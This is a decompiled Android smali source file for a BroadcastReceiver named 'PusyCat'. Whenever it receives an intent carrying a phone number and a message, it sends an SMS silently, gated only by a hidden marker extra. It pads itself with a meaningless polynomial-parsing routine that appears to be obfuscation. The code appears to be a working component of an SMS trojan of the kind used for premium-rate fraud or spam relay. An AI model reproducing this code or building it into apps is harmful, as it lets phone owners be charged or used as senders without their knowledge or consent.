.class public Lcom/up/net/PusyCat;
.super Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private a(Landroid/os/Bundle;Landroid/telephony/SmsManager;)Ljava/util/ArrayList;
    .locals 1

    const-string v0, "b"

    invoke-virtual {p1, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v0

    return-object v0
.end method

.method private static a()V
    .locals 15

    const/16 v14, 0x34

    const/16 v13, 0x33

    const/16 v12, 0x32

    const/16 v11, 0x31

    const/16 v10, 0x30

    const-string v7, "3x^4+5x^45-2+77x^100"

    const/4 v3, 0x0

    const-string v2, ""

    const/4 v1, 0x0

    :goto_0
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    if-lt v1, v0, :cond_0

    return-void

    :cond_0
    invoke-virtual {v7, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    const/16 v4, 0x78

    if-ne v0, v4, :cond_a

    add-int/lit8 v4, v1, 0x1

    const-string v0, ""

    const-string v6, ""

    const-string v5, ""

    :goto_1
    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    if-eq v8, v10, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    if-eq v8, v11, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    if-eq v8, v12, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    if-eq v8, v13, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    if-eq v8, v14, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    const/16 v9, 0x35

    if-eq v8, v9, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    const/16 v9, 0x36

    if-eq v8, v9, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    const/16 v9, 0x37

    if-eq v8, v9, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    const/16 v9, 0x38

    if-eq v8, v9, :cond_9

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v8

    const/16 v9, 0x39

    if-ne v8, v9, :cond_3

    move-object v0, v5

    :goto_2
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v5

    if-ge v4, v5, :cond_1

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v10, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v11, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v12, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v13, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v14, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v8, 0x35

    if-eq v5, v8, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v8, 0x36

    if-eq v5, v8, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v8, 0x37

    if-eq v5, v8, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v8, 0x38

    if-eq v5, v8, :cond_4

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v8, 0x39

    if-eq v5, v8, :cond_4

    :cond_1
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    add-int/lit8 v0, v4, -0x1

    add-int/lit8 v1, v1, -0x1

    const-string v5, ""

    move v4, v1

    move-object v1, v6

    :goto_3
    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    if-eq v6, v10, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    if-eq v6, v11, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    if-eq v6, v12, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    if-eq v6, v13, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    if-eq v6, v14, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    const/16 v9, 0x35

    if-eq v6, v9, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    const/16 v9, 0x36

    if-eq v6, v9, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    const/16 v9, 0x37

    if-eq v6, v9, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    const/16 v9, 0x38

    if-eq v6, v9, :cond_8

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    const/16 v9, 0x39

    if-ne v6, v9, :cond_5

    move-object v1, v5

    :goto_4
    if-ltz v4, :cond_2

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v10, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v11, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v12, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v13, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-eq v5, v14, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v6, 0x35

    if-eq v5, v6, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v6, 0x36

    if-eq v5, v6, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v6, 0x37

    if-eq v5, v6, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v6, 0x38

    if-eq v5, v6, :cond_6

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v5

    const/16 v6, 0x39

    if-eq v5, v6, :cond_6

    :cond_2
    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    :goto_5
    if-le v3, v4, :cond_7

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v3, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    mul-int/2addr v1, v8

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "x^"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    add-int/lit8 v2, v8, -0x1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    add-int/lit8 v2, v0, 0x1

    :goto_6
    add-int/lit8 v0, v0, 0x1

    move v3, v2

    move-object v2, v1

    move v1, v0

    goto/16 :goto_0

    :cond_3
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v8, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_1

    :cond_4
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v5, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    add-int/lit8 v4, v4, 0x1

    goto/16 :goto_2

    :cond_5
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v9

    invoke-static {v9}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v9

    invoke-direct {v6, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    add-int/lit8 v4, v4, -0x1

    goto/16 :goto_3

    :cond_6
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    invoke-static {v6}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    add-int/lit8 v4, v4, -0x1

    goto/16 :goto_4

    :cond_7
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v5, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v3}, Ljava/lang/String;->charAt(I)C

    move-result v2

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_5

    :cond_8
    move-object v1, v5

    goto/16 :goto_4

    :cond_9
    move-object v0, v5

    goto/16 :goto_2

    :cond_a
    move v0, v1

    move-object v1, v2

    move v2, v3

    goto/16 :goto_6
.end method

.method private a(Landroid/os/Bundle;Landroid/telephony/SmsManager;Ljava/util/ArrayList;)V
    .locals 6

    const/4 v2, 0x0

    :try_start_0
    invoke-static {}, Lcom/up/net/PusyCat;->a()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const-string v0, "a"

    invoke-virtual {p1, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    move-object v0, p2

    move-object v3, p3

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    const/4 v0, 0x0

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    move-object v2, v1

    if-eqz v2, :cond_2

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v1

    :goto_0
    if-eqz v1, :cond_0

    invoke-direct {p0, v2, v1}, Lcom/up/net/PusyCat;->a(Landroid/os/Bundle;Landroid/telephony/SmsManager;)Ljava/util/ArrayList;

    move-result-object v0

    :cond_0
    const-string v3, "Yt5g5g5hytyPweeff"

    invoke-virtual {p2, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v3

    if-nez v3, :cond_1

    invoke-direct {p0, v2, v1, v0}, Lcom/up/net/PusyCat;->a(Landroid/os/Bundle;Landroid/telephony/SmsManager;Ljava/util/ArrayList;)V

    :cond_1
    return-void

    :cond_2
    move-object v1, v0

    goto :goto_0
.end method
